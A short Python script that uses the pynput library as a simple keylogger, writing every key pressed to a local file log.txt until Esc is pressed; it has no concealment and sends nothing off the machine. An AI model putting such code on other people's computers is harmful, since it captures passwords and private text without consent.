from pynput.keyboard import Key, Listener
try:
    j = open("log.txt", "x") #checking if file already exists
except:
    pass
finally:
    f = open("log.txt", "a") #appending to file

with f: # opening log.txt
    def on_press(key):
            f.write('{0}'.format(key))

    def on_release(key):
            #f.write('{0} release'.format(key)) # 
            if key == Key.esc: # exit program with esc
                return False
    with Listener(on_press=on_press, on_release=on_release) as listener:
       listener.join()